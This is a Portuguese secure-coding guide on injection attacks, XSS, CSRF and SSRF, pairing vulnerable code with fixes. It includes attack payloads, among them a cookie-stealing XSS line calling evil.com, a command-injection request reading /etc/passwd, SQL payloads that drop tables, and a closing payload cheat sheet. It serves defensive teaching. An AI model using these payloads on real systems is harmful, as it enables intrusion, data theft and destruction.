# Injection & XSS — SQL, NoSQL, Command, XSS, SSRF

## Índice
1. SQL Injection
2. NoSQL Injection
3. Command Injection
4. XSS — Cross-Site Scripting
5. CSRF — Cross-Site Request Forgery
6. SSRF — Detalhado
7. Cheat Sheet de Payloads (para teste)

---

## 1. SQL Injection

### O ataque

```
Input do user inserido diretamente na query SQL.
O atacante "escapa" do contexto de dados e injeta CÓDIGO SQL.
```

```javascript
// ❌ VULNERÁVEL — string concatenation
const query = `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`;

// Atacante envia: email = "admin@test.com' OR '1'='1' --"
// Query vira: SELECT * FROM users WHERE email = 'admin@test.com' OR '1'='1' --' AND password = ''
// Resultado: retorna o primeiro user (geralmente admin)

// Variantes:
// ' UNION SELECT username, password FROM users --       → Dump de dados
// '; DROP TABLE users; --                               → Destruição de dados
// ' OR 1=1; UPDATE users SET role='admin' WHERE email='attacker@evil.com'; --
```

### Remediação

```javascript
// ✅ Parameterized queries (SEMPRE)

// Prisma (ORM) — seguro por default
const user = await prisma.user.findFirst({
  where: { email: email, password: passwordHash },
});

// pg (driver nativo) — $1, $2 são placeholders
const result = await pool.query(
  'SELECT * FROM users WHERE email = $1 AND password_hash = $2',
  [email, passwordHash]
);

// Knex (query builder) — .where() é parameterized
const user = await knex('users').where({ email }).first();

// Sequelize — substitutions são parameterized
const [users] = await sequelize.query(
  'SELECT * FROM users WHERE email = :email',
  { replacements: { email }, type: QueryTypes.SELECT }
);
```

```python
# Python — NUNCA f-string em SQL

# ❌ Vulnerável
cursor.execute(f"SELECT * FROM users WHERE email = '{email}'")

# ✅ Parameterized
cursor.execute("SELECT * FROM users WHERE email = %s", (email,))

# ✅ SQLAlchemy ORM
user = session.query(User).filter(User.email == email).first()
```

### Regra absoluta

```
Se a query contém qualquer variável vinda de input externo
e essa variável não é um parâmetro ($1, :param, ?), é SQL injection.

Sem exceções. Sem "mas esse campo é só numérico".
O atacante vai enviar string onde você espera número.
```

---

## 2. NoSQL Injection

```javascript
// MongoDB — ❌ Vulnerável
const user = await db.collection('users').findOne({
  email: req.body.email,
  password: req.body.password,
});

// Atacante envia: { "email": "admin@test.com", "password": { "$ne": "" } }
// Query vira: find({ email: "admin@test.com", password: { $ne: "" } })
// Resultado: retorna user onde password NÃO é vazio = qualquer user

// ✅ Corrigido — validar tipos e sanitizar
import { z } from 'zod';
const loginSchema = z.object({
  email: z.string().email(),
  password: z.string().min(1), // Força tipo string
});

const { email, password } = loginSchema.parse(req.body);
// Agora password é garantidamente string, não objeto
```

---

## 3. Command Injection

```javascript
// ❌ Vulnerável — input em shell command
const { exec } = require('child_process');
app.get('/api/ping', (req, res) => {
  exec(`ping -c 4 ${req.query.host}`, (err, stdout) => {
    res.json({ output: stdout });
  });
});

// Atacante: GET /api/ping?host=google.com;%20cat%20/etc/passwd
// Executa: ping -c 4 google.com; cat /etc/passwd

// ✅ Corrigido — usar execFile (não interpreta shell) + validar
const { execFile } = require('child_process');
const isValidHost = /^[a-zA-Z0-9.-]+$/.test(host);

if (!isValidHost) return res.status(400).json({ error: 'Host inválido' });

execFile('ping', ['-c', '4', host], (err, stdout) => {
  res.json({ output: stdout });
});

// Melhor ainda: não executar comando do OS. Usar lib nativa.
```

---

## 4. XSS — Cross-Site Scripting

### Tipos

```
Stored XSS (Persistente) — SEVERIDADE: HIGH
  Atacante salva script no banco (ex: nome do perfil).
  Todo user que visualiza o perfil executa o script.
  Exemplo: <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">

Reflected XSS — SEVERIDADE: MEDIUM
  Script vem na URL e é refletido no HTML da resposta.
  Atacante envia link malicioso para a vítima.
  Exemplo: /search?q=<script>alert('xss')</script>

DOM-based XSS — SEVERIDADE: MEDIUM
  Script manipula o DOM no client sem passar pelo server.
  Exemplo: document.getElementById('output').innerHTML = location.hash.slice(1);
```

### Remediação

```javascript
// Backend — ESCAPAR output

// ❌ Template sem escape
res.send(`<h1>Olá, ${user.name}</h1>`);
// Se name = "<script>alert('xss')</script>", executa!

// ✅ Frameworks modernos escapam por default:
// React: JSX escapa automaticamente
//   <h1>{user.name}</h1>  ← seguro, escapa HTML
//   <div dangerouslySetInnerHTML={{ __html: userInput }} />  ← PERIGOSO!
//
// EJS: <%= escapa, <%- não escapa
//   <%= user.name %>  ← seguro
//   <%- user.name %>  ← VULNERÁVEL

// API — sanitizar antes de salvar
import DOMPurify from 'isomorphic-dompurify';
const clean = DOMPurify.sanitize(userInput); // Remove tags perigosas

// CSP Header — última linha de defesa
// Content-Security-Policy: default-src 'self'; script-src 'self'
// Mesmo se XSS passar, scripts inline não executam
```

### ⚠️ Nunca confiar em

```
❌ innerHTML, outerHTML, document.write()
❌ dangerouslySetInnerHTML (React)
❌ v-html (Vue)
❌ [innerHTML] (Angular)
❌ {!! $var !!} (Blade/Laravel)
❌ <%- var %> (EJS)
❌ |safe (Jinja2/Django)
```

---

## 5. CSRF — Cross-Site Request Forgery

```
Ataque: Site malicioso faz request para SUA API usando a sessão
do user (cookie enviado automaticamente pelo browser).

Cenário:
1. User logado no bank.com (cookie de sessão)
2. User visita evil.com
3. evil.com contém: <form action="https://bank.com/transfer" method="POST">
                      <input name="to" value="attacker">
                      <input name="amount" value="10000">
                    </form>
                    <script>document.forms[0].submit()</script>
4. Browser envia request COM o cookie do bank.com!

Proteções:
├── SameSite cookie (Lax ou Strict)
├── CSRF token (sincronizar token entre form e server)
├── Verificar Origin/Referer header
├── APIs com Bearer token (não cookie) são IMUNES
└── Double-submit cookie pattern
```

```javascript
// Se usar cookie-based auth:
app.use(session({
  cookie: {
    httpOnly: true,     // Inacessível via JavaScript
    secure: true,       // Apenas HTTPS
    sameSite: 'lax',    // Protege contra CSRF cross-site
    maxAge: 24 * 60 * 60 * 1000, // 24h
  },
}));

// Se usar JWT Bearer token: CSRF não se aplica
// O token está no header Authorization, não em cookie
// Site malicioso não consegue ler/enviar o header
```

---

## 6. SSRF — Detalhado

```javascript
// Cenários comuns de SSRF:
//
// 1. URL preview (Slack-like) — user envia URL, app faz fetch para gerar preview
// 2. Webhook URL — user configura URL de callback
// 3. Image proxy — app faz fetch de imagem por URL
// 4. PDF generator — renderiza URL em PDF
// 5. Import from URL — importar arquivo de URL

// Defesa: validar URL + resolver DNS + checar IP

async function safeFetch(urlString) {
  // 1. Validar formato
  const parsed = new URL(urlString);
  if (!['http:', 'https:'].includes(parsed.protocol)) {
    throw new Error('Only HTTP(S) allowed');
  }

  // 2. Resolver DNS para IP real
  const { address } = await dns.promises.lookup(parsed.hostname);

  // 3. Validar que IP não é interno
  const ip = ipaddr.parse(address);
  const blockedRanges = ['private', 'loopback', 'linkLocal',
                         'uniqueLocal', 'carrierGradeNat'];
  if (blockedRanges.includes(ip.range())) {
    throw new Error('Internal addresses not allowed');
  }

  // 4. Bloquear metadata endpoints conhecidos
  if (parsed.hostname === '169.254.169.254') { // AWS metadata
    throw new Error('Metadata endpoint blocked');
  }

  // 5. Fazer fetch com timeout e sem seguir redirects
  const response = await fetch(urlString, {
    redirect: 'error', // Não seguir redirects (podem redirecionar para interno)
    signal: AbortSignal.timeout(5000),
  });

  return response;
}
```

---

## 7. Cheat Sheet de Payloads (para teste)

```
APENAS para testar SEU PRÓPRIO sistema em ambiente controlado.

SQL Injection:
  ' OR '1'='1
  ' OR '1'='1' --
  ' UNION SELECT null, null, null --
  1; DROP TABLE users --

XSS:
  <script>alert('XSS')</script>
  <img src=x onerror="alert('XSS')">
  javascript:alert('XSS')
  " onfocus="alert('XSS')" autofocus="

NoSQL:
  { "$ne": "" }
  { "$gt": "" }
  { "$regex": ".*" }

Command Injection:
  ; ls -la
  | cat /etc/passwd
  $(whoami)
  `id`

Path Traversal:
  ../../etc/passwd
  ..%2f..%2fetc%2fpasswd
  ....//....//etc/passwd

SSRF:
  http://127.0.0.1
  http://169.254.169.254/latest/meta-data/
  http://[::1]
  http://0x7f000001
```
